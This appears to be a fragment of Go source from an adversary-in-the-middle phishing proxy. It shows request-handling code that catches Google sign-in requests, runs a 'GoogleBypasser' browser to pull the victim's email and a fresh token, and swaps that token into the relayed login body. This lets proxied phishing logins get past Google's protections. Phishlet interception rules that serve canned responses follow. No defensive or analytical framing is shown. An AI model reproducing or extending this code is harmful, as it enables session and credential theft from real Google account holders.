 		if strings.EqualFold(req.Host, "accounts.google.com") && strings.Contains(req.URL.String(), "/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(req.URL.String(), "rpcids=V1UmUe") {
		log.Debug("GoogleBypass working with: %v", req.RequestURI)

	 			decodedBody, err := url.QueryUnescape(string(body))
	 			if err != nil {
	 				log.Error("Failed to decode body: %v", err)
	 			}
	 			decodedBodyBytes := []byte(decodedBody)
	 			b := &GoogleBypasser{
	 				isHeadless:     false,
	 				withDevTools:   false,
	 				slowMotionTime: 1500,
	 			}
	 			b.Launch()
	 			b.GetEmail(decodedBodyBytes)
	 			b.GetToken()
	 			decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)

	 			postForm, err := url.ParseQuery(string(decodedBodyBytes))
	 			if err != nil {
	 				log.Error("Failed to parse form data: %v", err)
	 			}
	 			body = []byte(postForm.Encode())
	 			req.ContentLength = int64(len(body))
	 		}

	 		req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
	 	}
	 }

	 if pl != nil {
	 	if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
	 		for _, ic := range pl.intercept {
	 			//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
	 			//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
	 			if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
	 				return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
	 			}
 		}
	 	}
	 }